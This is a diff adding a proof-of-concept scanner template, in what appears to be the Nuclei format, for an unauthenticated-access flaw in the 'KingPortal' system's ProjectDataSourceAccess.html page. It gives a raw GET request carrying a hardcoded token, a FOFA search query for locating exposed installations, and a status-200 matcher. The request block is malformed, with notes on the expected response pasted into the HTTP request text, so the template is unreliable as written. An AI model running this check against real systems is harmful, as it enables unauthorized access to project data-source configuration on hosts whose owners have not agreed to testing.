@@ -1,0 +1,34 @@
+id: poc-ihz66bxamr6gt0x3
+info:
+  name: KingPortal开发系统 ProjectDataSourceAccess.html未授权访问漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ihz66bxamr6gt0x3'
+  tags: rce,unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ihz66bxamr6gt0x3
+    fofa: title="KingPortal"
+http:
+- raw:
+  - 'GET /views/ProjectDataSourceAccess.html?token=2ccdf191078bd4e8e85b526ec44f7dd31ad7cf81&amp;refreshToken=null HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    projectConfigTree
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
